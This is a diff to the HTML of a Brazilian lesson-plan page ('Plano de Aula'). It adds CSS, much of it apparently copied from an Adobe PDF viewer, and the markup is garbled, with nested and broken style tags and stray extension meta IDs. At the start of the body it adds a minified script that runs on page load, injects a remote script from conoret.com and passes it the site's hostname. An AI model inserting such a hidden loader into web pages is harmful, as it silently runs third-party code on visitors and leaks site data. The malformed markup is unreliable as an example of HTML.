@@ -2,7 +2,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Plano de Aula - Educação Profissional Paulista</title>
-    <style>
+<style>
         body { 
             font-family: Verdana, sans-serif; 
             margin: 20px; 
@@ -58,7 +58,187 @@
         h2 {
             text-align: center;
         }
+        
+        /* These rules are active only in PDF fullscreen mode */
+        html.fullscreen-mode {
+          overflow: hidden;
+      /* Disable overscroll history navigation */
+      touch-action: none;
+        }
+
+        html.fullscreen-mode #ui-container {
+      display: none;
+        }
+
+        html.fullscreen-mode #pdf-embed {
+      clip-path: inset(
+        calc(var(--y-clip-start) * var(--page-scale)) 0
+        calc(var(--y-clip-end) * var(--page-scale)) 0
+      );
+      background-color: #333;
+    }
+   <style>
+    /* TODO(37810027): Reuse dark mode styles above instead of duplicating them */
+    html.fullscreen-mode {
+      background-color: #333;
+      color: #FFF;
+      }
+
+      html.fullscreen-mode #embed-border {
+  border: 2px #787878 solid;
+  }
+
+  #sizer {
+  position: absolute;
+     }
+
+    #internal-document-container {
+  user-select: none;
+    }
+
     </style>
+    <style>/*************************************************************************
+ *
+ *  Copyright 2021 Adobe
+ *  All Rights Reserved.
+ *
+ * NOTICE: All information contained herein is, and remains
+ * the property of Adobe and its suppliers, if any. The intellectual
+ * and technical concepts contained herein are proprietary to Adobe
+ * and its suppliers and are protected by all applicable intellectual
+ * property laws, including trade secret and copyright laws.
+ * Dissemination of this information or reproduction of this material
+ * is strictly forbidden unless prior written permission is obtained
+ * from Adobe.
+ **************************************************************************/
+    .Oddl1utlMoNuv61EjBcF {
+  margin: auto;
+  position: absolute !important;
+  -webkit-user-select: none;
+  -khtml-user-select: none;
+  -moz-user-select: none;
+  -o-user-select: none;
+  user-select: none;
+    }
+    </style><style>/*************************************************************************
+ *
+ *  Copyright 2021 Adobe
+ *  All Rights Reserved.
+ *
+ * NOTICE: All information contained herein is, and remains
+ * the property of Adobe and its suppliers, if any. The intellectual
+ * and technical concepts contained herein are proprietary to Adobe
+ * and its suppliers and are protected by all applicable intellectual
+ * property laws, including trade secret and copyright laws.
+ * Dissemination of this information or reproduction of this material
+ * is strictly forbidden unless prior written permission is obtained
+ * from Adobe.
+ **************************************************************************/
+    .GsIfgY0lIuAlDSkwm8mL {
+  box-sizing: border-box;
+  outline-offset: 2px;
+  overflow-wrap: break-word;
+  padding: 3px 1px 3px 1px;
+  resize: none;
+    }
+
+    .sVfMzMMBDI3gY8s5cdGh {
+  box-sizing: border-box;
+  outline-offset: 2px;
+  padding: 0 1px 0 1px;
+    }
+
+    .sVfMzMMBDI3gY8s5cdGh::-ms-clear {
+  display: none;
+    }
+
+    .ILZW8o_Pdbkvki8i669Y {
+  position: absolute;
+    }
+
+    ._eRzkBRC0R3VURGHwGT7 {
+  position: absolute;
+    }
+
+    .t1rhizkgKGtH8WPHnqvc {
+  box-sizing: border-box;
+    }
+    </style><style>/*************************************************************************
+ *
+ *  Copyright 2021 Adobe
+ *  All Rights Reserved.
+ *
+ * NOTICE: All information contained herein is, and remains
+ * the property of Adobe and its suppliers, if any. The intellectual
+ * and technical concepts contained herein are proprietary to Adobe
+ * and its suppliers and are protected by all applicable intellectual
+ * property laws, including trade secret and copyright laws.
+ * Dissemination of this information or reproduction of this material
+ * is strictly forbidden unless prior written permission is obtained
+ * from Adobe.
+ **************************************************************************/
+    .VgBTPYWI5xr_2LqOWB7F {
+      pointer-events: none;
+    }
+    </style><style>/*************************************************************************
+ *
+ *  Copyright 2021 Adobe
+ *  All Rights Reserved.
+ *
+ * NOTICE: All information contained herein is, and remains
+ * the property of Adobe and its suppliers, if any. The intellectual
+ * and technical concepts contained herein are proprietary to Adobe
+ * and its suppliers and are protected by all applicable intellectual
+ * property laws, including trade secret and copyright laws.
+ * Dissemination of this information or reproduction of this material
+ * is strictly forbidden unless prior written permission is obtained
+ * from Adobe.
+ **************************************************************************/
+    .MNENsV7k9g3c0KPChmM2 {
+  box-sizing: border-box;
+  font-size: initial;
+  padding: 0;
+  position: absolute;
+  outline-offset: 2px;
+    }
+
+    .dxfgCpjeEo1X9NR123K2 {
+  box-sizing: border-box;
+    }
+
+    .mJUqifJUtlZpqjaIujA7 {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+    }
+
+    .zrzvwCJFujPc23w1QlOd {
+      position: absolute;
+    }
+
+    .NDCs1PhJx4Yxq9G9ftaQ {
+  position: absolute;
+    }
+
+    .cPvc5yi2EbjhJxIb0N0I {
+  font-size: 0;
+    }
+    </style><style>/*************************************************************************
+ *
+ *  Copyright 2021 Adobe
+ *  All Rights Reserved.
+ *
+ * NOTICE: All information contained herein is, and remains
+ * the property of Adobe and its suppliers, if any. The intellectual
+ * and technical concepts contained herein are proprietary to Adobe
+ * and its suppliers and are protected by all applicable intellectual
+ * property laws, including trade secret and copyright laws.
+ * Dissemination of this information or reproduction of this material
+ * is strictly forbidden unless prior written permission is obtained
+ * from Adobe.
+ **************************************************************************/</style
+
+</style>
 <meta id="bbafmabaelnnkondpfpjmdklbmfnbmol"><meta id="nedeegdmhlnmboboahchfpkmdnnemapd"><meta id="dcngeagmmhegagicpcmpinaoklddcgon">
 </head>
 <body><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
